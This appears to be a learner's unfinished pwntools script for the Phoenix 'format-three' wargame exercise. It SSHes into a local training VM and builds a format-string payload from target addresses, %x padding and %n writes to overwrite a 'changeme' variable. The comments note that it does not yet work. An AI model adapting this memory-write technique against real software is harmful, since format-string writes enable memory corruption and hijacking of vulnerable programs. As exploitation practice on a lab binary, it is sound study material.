#!/usr/bin/python
#work on this later
from pwn import *
s = ssh(user='user', host='localhost', password='user', port=2222)
#s.interactive()
'''
nm /opt/phoenix/i486/format-three | grep changeme
shows us that changeme is at memory address 0x08049844
we don't have enough space so we will write to the memory addresses
next to the changeme variable to get the length in %n to be larger
I can't seem to get the value any closer
'''
buf = "\x44\x98\x04\x08"
buf += "\x45\x98\x04\x08"
buf += "\x46\x98\x04\x08"
buf += "\x47\x98\x04\x08"
buf += "\x48\x98\x04\x08"
buf += "%01x"
buf += ("%x"*4) + "%02x%07x%02x" + ("%x"*3)
buf += "%n"
buf += " " * 51
buf += "%n"
buf += " " * 200
buf += "%n"
buf += " " * 31
buf += "%n"
buf += " " * 20
buf += "%n"
print(s['echo -e "'+buf+'" | /opt/phoenix/i486/format-three'])
